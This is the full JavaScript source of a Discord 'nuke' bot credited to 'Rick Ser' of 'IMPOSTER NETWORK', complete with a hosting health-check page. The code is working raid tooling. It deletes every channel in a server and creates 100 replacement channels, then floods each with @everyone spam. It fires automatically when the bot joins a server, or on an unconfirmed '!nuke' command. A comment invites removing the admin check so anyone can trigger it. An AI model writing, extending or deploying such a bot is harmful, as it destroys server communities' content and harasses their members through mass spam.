// index.js - ULTRA FAST DISCORD NUKE BOT - NO CONFIRMATION, 100 CHANNELS, 1000 @everyone MESSAGES
require('dotenv').config();
const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js');
const express = require('express');
const chalk = require('chalk');
const config = require('./config.js');

// Express server for Render
const app = express();
const PORT = process.env.PORT || config.port;

app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>ULTRA NUKE BOT</title>
                <style>
                    body { 
                        background: linear-gradient(45deg, #000000, #ff0000);
                        color: white;
                        font-family: Arial;
                        text-align: center;
                        padding: 50px;
                    }
                    h1 { font-size: 50px; text-shadow: 0 0 10px red; }
                    .stats { 
                        background: rgba(0,0,0,0.7);
                        padding: 20px;
                        border-radius: 10px;
                        border: 2px solid red;
                        font-size: 20px;
                    }
                    .blink { animation: blink 1s infinite; }
                    @keyframes blink { 50% { opacity: 0; } }
                    .counter { color: #ff0000; font-size: 30px; }
                </style>
            </head>
            <body>
                <h1>💀 ULTRA FAST NUKE BOT 💀</h1>
                <div class="stats">
                    <h2 class="blink">✅ BOT OPERATIONAL</h2>
                    <p>🔥 <span class="counter">100 CHANNELS</span> 🔥</p>
                    <p>⚡ <span class="counter">1000 @EVERYONE MESSAGES</span> ⚡</p>
                    <p>💀 NO CONFIRMATION - INSTANT NUKE</p>
                    <p>⚡ By: Rick Ser</p>
                    <p>📊 Command: <span style="color: #ff0000">!nuke</span></p>
                </div>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(chalk.green(`[SERVER] Health check running on port ${PORT}`));
});

// Initialize Discord Client
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// Console Colors
const colors = {
    red: chalk.red.bold,
    green: chalk.green.bold,
    yellow: chalk.yellow.bold,
    blue: chalk.blue.bold,
    magenta: chalk.magenta.bold,
    cyan: chalk.cyan.bold,
    rainbow: (text) => {
        const colors = [chalk.red, chalk.yellow, chalk.green, chalk.blue, chalk.magenta, chalk.cyan];
        return text.split('').map((char, i) => colors[i % colors.length](char)).join('');
    }
};

// Bot Ready
client.once('ready', () => {
    console.clear();
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.red('██╗   ██╗██╗  ████████╗██████╗  █████╗     ███████╗ █████╗ ███████╗████████╗'));
    console.log(colors.red('██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝╚══██╔══╝'));
    console.log(colors.red('██║   ██║██║     ██║   ██████╔╝███████║    █████╗  ██║  ██║███████╗   ██║   '));
    console.log(colors.red('██║   ██║██║     ██║   ██╔══██╗██╔══██║    ██╔══╝  ██║  ██║╚════██║   ██║   '));
    console.log(colors.red('╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ██║     ╚█████╔╝███████║   ██║   '));
    console.log(colors.red(' ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝      ╚════╝ ╚══════╝   ╚═╝   '));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.green(`✅ BOT: ${client.user.tag}`));
    console.log(colors.yellow(`📊 SERVERS: ${client.guilds.cache.size}`));
    console.log(colors.red(`💀 NUKE MODE: INSTANT - NO CONFIRMATION`));
    console.log(colors.cyan(`⚡ CHANNELS TO CREATE: ${config.channelsToCreate}`));
    console.log(colors.magenta(`🔥 MESSAGES PER CHANNEL: ${config.messagesPerChannel}`));
    console.log(colors.blue(`💬 TOTAL @everyone SPAM: ${config.channelsToCreate * config.messagesPerChannel}`));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));

    // Rotating Status
    let statusIndex = 0;
    setInterval(() => {
        const status = config.statusMessages[statusIndex % config.statusMessages.length];
        client.user.setPresence({
            activities: [{ name: status, type: ActivityType.Playing }],
            status: 'dnd'
        });
        statusIndex++;
    }, 5000);
});

// AUTO-NUKE ON JOIN
client.on('guildCreate', async (guild) => {
    if (!config.autoNukeOnJoin) return;
    
    console.log(colors.red(`[!] AUTO-NUKE: Joined ${guild.name}`));
    await delay(1000); // Small delay to ensure permissions
    await executeNuke(guild);
});

// MESSAGE COMMAND HANDLER
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // !nuke - INSTANT NO CONFIRMATION
    if (command === 'nuke') {
        console.log(colors.red(`[NUKE] Triggered by ${message.author.tag} in ${message.guild.name}`));
        
        // Optional: Check admin (remove these 3 lines if you want anyone to use it)
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ Admin only!');
        }
        
        // INSTANT NUKE - NO QUESTIONS ASKED
        await message.reply('💀 **INSTANT NUKE ACTIVATED** 💀\nDeleting all channels...');
        await executeNuke(message.guild);
        return;
    }

    // !help - Quick help
    if (command === 'help') {
        const helpEmbed = {
            color: 0xff0000,
            title: '💀 ULTRA FAST NUKE BOT 💀',
            description: '**100 CHANNELS | 1000 @everyone SPAM**',
            fields: [
                {
                    name: '!nuke',
                    value: '💥 INSTANT - Deletes ALL channels, creates 100 IMPOSTER-network channels, spams 10 @everyone messages in each',
                    inline: false
                },
                {
                    name: '!help',
                    value: '📚 Shows this message',
                    inline: false
                }
            ],
            footer: { text: 'ULTRA FAST by Rick Ser | 1000 @everyone SPAM' }
        };
        await message.channel.send({ embeds: [helpEmbed] });
        return;
    }
});

// MAIN NUKE FUNCTION - OPTIMIZED FOR MAXIMUM SPEED
async function executeNuke(guild) {
    console.log(colors.red(`[NUKE] STARTING ULTRA FAST OPERATION in ${guild.name}`));
    const startTime = Date.now();
    
    try {
        // PHASE 1: DELETE ALL CHANNELS (SUPER FAST)
        console.log(colors.yellow(`[PHASE 1] Deleting all channels...`));
        const channels = await guild.channels.fetch();
        const channelList = Array.from(channels.values());
        
        let deleted = 0;
        // Use Promise.all for parallel deletion where possible
        const deletePromises = channelList.map(async (channel) => {
            try {
                await channel.delete();
                deleted++;
                console.log(colors.red(`[DELETE] ${channel.name}`));
            } catch (e) {
                // Ignore errors
            }
        });
        
        await Promise.all(deletePromises);
        console.log(colors.green(`[PHASE 1] Deleted ${deleted} channels`));
        
        // PHASE 2: CREATE 100 CHANNELS (PARALLEL BATCHES)
        console.log(colors.yellow(`[PHASE 2] Creating ${config.channelsToCreate} channels...`));
        
        const createdChannels = [];
        // Create in batches of 5 for speed
        for (let i = 0; i < config.channelsToCreate; i += 5) {
            const batchPromises = [];
            for (let j = 0; j < 5 && (i + j) < config.channelsToCreate; j++) {
                const channelNum = i + j + 1;
                const channelName = channelNum === 1 ? config.channelName : `${config.channelName}-${channelNum}`;
                
                batchPromises.push(
                    guild.channels.create({
                        name: channelName,
                        type: 0,
                        reason: 'NUKE BY RICK SER'
                    }).then(channel => {
                        createdChannels.push(channel);
                        console.log(colors.green(`[CREATE] ${channelName}`));
                        return channel;
                    }).catch(e => null)
                );
            }
            await Promise.all(batchPromises);
            await delay(200); // Small delay between batches
        }
        
        console.log(colors.green(`[PHASE 2] Created ${createdChannels.length} channels`));
        
        // PHASE 3: MASS @everyone SPAM - 10 MESSAGES PER CHANNEL
        console.log(colors.yellow(`[PHASE 3] Starting MASS @everyone SPAM...`));
        
        let totalMessages = 0;
        const spamStartTime = Date.now();
        
        // Spam in batches for MAXIMUM SPEED
        for (const channel of createdChannels) {
            try {
                // Send 10 messages with @everyone as fast as possible
                const spamPromises = [];
                for (let m = 0; m < config.messagesPerChannel; m++) {
                    const randomMsg = config.spamMessages[m % config.spamMessages.length];
                    spamPromises.push(
                        channel.send(randomMsg).then(() => {
                            totalMessages++;
                            if (totalMessages % 100 === 0) {
                                console.log(colors.cyan(`[SPAM] ${totalMessages}/1000 messages sent`));
                            }
                        }).catch(e => null)
                    );
                }
                
                // Send all 10 messages in parallel
                await Promise.all(spamPromises);
                
                // Send final embed in each channel
                await channel.send({
                    embeds: [{
                        color: 0xff0000,
                        title: '💀 MASS NUKE COMPLETE 💀',
                        description: `**100 CHANNELS | 1000 @everyone MESSAGES**`,
                        fields: [
                            { name: 'Channels Deleted', value: `${deleted}`, inline: true },
                            { name: 'Channels Created', value: `${createdChannels.length}`, inline: true },
                            { name: 'Messages Sent', value: `${totalMessages}`, inline: true },
                            { name: '@everyone Pings', value: `${totalMessages}`, inline: true },
                            { name: 'Time Taken', value: `${((Date.now() - startTime)/1000).toFixed(1)}s`, inline: true },
                            { name: 'By', value: 'Rick Ser', inline: true }
                        ],
                        footer: { text: 'IMPOSTER NETWORK' }
                    }]
                }).catch(e => null);
                
            } catch (e) {
                // Ignore errors - keep spamming
            }
        }
        
        const totalTime = ((Date.now() - startTime)/1000).toFixed(1);
        
        // FINAL LOG
        console.log(colors.rainbow('══════════════════════════════════════════════'));
        console.log(colors.red(`💀 ULTRA FAST NUKE COMPLETE!`));
        console.log(colors.yellow(`📊 FINAL STATISTICS:`));
        console.log(colors.green(`   ├─ Deleted: ${deleted} channels`));
        console.log(colors.green(`   ├─ Created: ${createdChannels.length} channels`));
        console.log(colors.green(`   ├─ @everyone Messages: ${totalMessages}`));
        console.log(colors.green(`   └─ Time: ${totalTime} seconds`));
        console.log(colors.red(`💀 By: Rick Ser | IMPOSTER NETWORK`));
        console.log(colors.rainbow('══════════════════════════════════════════════'));
        
        // Try to send final message in first channel
        if (createdChannels.length > 0) {
            try {
                await createdChannels[0].send(`@everyone **NUKE COMPLETE** @everyone\n**${totalMessages} @everyone messages sent in ${totalTime}s**`);
            } catch (e) {}
        }
        
    } catch (error) {
        console.log(colors.red(`[FATAL] ${error.message}`));
    }
}

// Utility delay
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Error handling
client.on('error', console.error);
process.on('unhandledRejection', console.error);

// Login
if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
    console.log(colors.red('[ERROR] No token in config.js'));
    console.log(colors.yellow('Set DISCORD_TOKEN in .env file'));
    process.exit(1);
}

client.login(config.token).then(() => {
    console.log(colors.green('[LOGIN] Success!'));
}).catch(console.error);
